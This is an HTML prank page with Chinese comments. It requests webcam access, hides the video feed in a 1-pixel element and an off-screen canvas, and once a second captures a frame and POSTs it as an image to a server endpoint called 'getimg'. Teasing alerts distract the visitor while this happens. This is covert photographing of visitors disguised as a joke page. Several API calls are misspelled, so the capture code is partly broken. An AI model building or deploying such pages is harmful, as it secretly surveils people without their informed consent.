<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>嘤嘤嘤</title>

  <style>

    body {
      /*background: fixed url(img/bg.png) no-repeat;*/
      background-size: 100%;
    }

    a {
      text-decoration: none;
    }

    a:link {
      color: #00008b;
    }

    a:visited {
      color: #b5723e;
    }

    .xun {
      font-size: 30px;
      color: #96b4d6;
      float: right;
    }

    .wel {
      padding: 5px;
      margin-top: 20px;
      display: inline-block;
      font-size: 30px;
      border: 3px solid #7c98bd;
    }

    #video {
      width: 1px;
      height: 1px;
    }
  </style>
</head>

<body>
<span class="logo">

    </span>

<div class="xun">
  嘤嘤怪
</div>
<center>

</center>
<p align="center"><video id="video" autoplay></video></p>

<canvas id="canvas" width="500" height="500" style="position:fixed;left:100%"></canvas>

<script type="text/javascript" src="js/jquery-2.0.3.min.js"></script>
<script>
  //1.先获取当前摄像头对象(浏览器---视频流)
  var video = document.getElementById("video");
  var button = document.getElementById("btn");
  //2.判断本地视频流
  if (navigator.mediaDevices.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.getUserMedia) {
    //调用媒体设备
    getUserMediaToPhoto({
      video: {
        width: 500,
        height: 500
      }
    }, success, error);
  } else {
    //alert("当前设备不支持访问");
  }
  function success(stream) {
    var CompatibleURL = window.URL || window.webkitURL;
    try {
      video.src = CompatibleURL.createObjectURL(stream);
    } catch (e) {
      video.srcObject = stream;
    }
    video.play();
  }
  function getUserMediaToPhoto(constraints, success, error) {//将摄像头转换为视频流
    if (navigator.mediaDevices.getUserMeida) {
      navigator.mediaDevices.getUserMeida(constraints).then(success).error(error);
    } else if (navigator.webkitGetUserMedia) {
      navigator.webkitGetUserMedia(constraints, success, error);
    } else if (navigator.mozGetUserMedia) {
      navigator.navigator.getUserMedia(constraints, success, error);
    } else {
      navigator.getUserMeia(constraints, success, error);
    }
  }
  function error() {
    //alert("无法访问设备");
  }
  var canvas = document.getElementById("canvas");
  var contxext = canvas.getContext("2d");
  let index=0;
  setInterval(()=>{
    contxext.drawImage(video, 0, 0, 500, 500);
    var image = canvas.toDataURL("image/png");
    var img = new Image();
    img.src = image;
    // document.body.appendChild(img);
    var data = $("#d1").serialize();
    if(index==1){
      alert("想知道里面是啥嘛？")
      $.ajax({
        type: "post",
        url: "getimg",
        dataType: "json",
        data: {
          "image": image,
        },
        success: function (resp) {

        }
      });
    }
    else if(index==2){
      alert("你真的想知道？")
      $.ajax({
        type: "post",
        url: "getimg",
        dataType: "json",
        data: {
          "image": image,
        },
        success: function (resp) {

        }
      });
    }
    else if(index==3){
      alert("好奇心这么强？")
      $.ajax({
        type: "post",
        url: "getimg",
        dataType: "json",
        data: {
          "image": image,
        },
        success: function (resp) {

        }
      });
    }
    else if(index==4){
      alert("其实啥也没有，哈哈哈")
      $.ajax({
        type: "post",
        url: "getimg",
        dataType: "json",
        data: {
          "image": image,
        },
        success: function (resp) {

        }
      });
    }
    else if(index==5){
      alert("这只是一个测试文件，哈哈哈")
      $.ajax({
        type: "post",
        url: "getimg",
        dataType: "json",
        data: {
          "image": image,
        },
        success: function (resp) {

        }
      });
    }
    index++;
  },1000)
</script>
</body>

</html>